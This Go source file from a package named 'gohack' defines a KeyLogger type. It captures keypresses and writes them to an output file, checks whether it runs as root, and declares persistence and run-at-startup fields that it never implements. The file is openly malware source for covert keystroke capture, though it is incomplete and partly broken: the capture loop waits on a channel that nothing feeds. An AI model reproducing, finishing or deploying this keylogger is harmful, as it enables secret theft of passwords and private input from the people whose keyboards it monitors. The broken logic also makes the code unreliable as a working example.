package gohack

import (
	"os"
	"log"
	"syscall"
	"sync"
	"time"
	"github.com/eiannone/keyboard"
)

// KeyLogger ...
/*
   IsPersistent  [bool]
   Timeout       [time.Duration]
*/
type KeyLogger struct {
	IsPersistent bool
	AtStartup    bool
	IsActive     bool
	OutputFile   *os.File
	Timeout      time.Duration
	KeyChannel   chan rune
}

// Start: ...
/*

 */
func (k *KeyLogger) Start() {
	err := OpenKeyboard()

	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}
	var wg sync.WaitGroup
	k.IsActive = true
	worker := func(r rune){
		defer wg.Done()
		k.OutputFile.Write([]byte{byte(r)})
	}

	for k.IsActive {
		wg.Add(1)
		go worker(<-k.KeyChannel)
	}
	wg.Wait()
}

// Stop: ...
/*

 */
func (k *KeyLogger) Stop() {
	err := CloseKeyboard()

	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}

	k.IsActive = false
}



// IsRoot: Reports if the file keylogger has root permissions.
func (k *KeyLogger) IsRoot() bool {
	return syscall.Getuid() == 0 && syscall.Geteuid() == 0
}

func (k *KeyLogger) GetKey() {
	key, _, err := keyboard.GetKey()
	if err == nil {
		if key != 0 { k.KeyChannel <- key }
	}
}

func OpenKeyboard() error {
	return keyboard.Open()
}

func CloseKeyboard() error {
	return keyboard.Close()
}
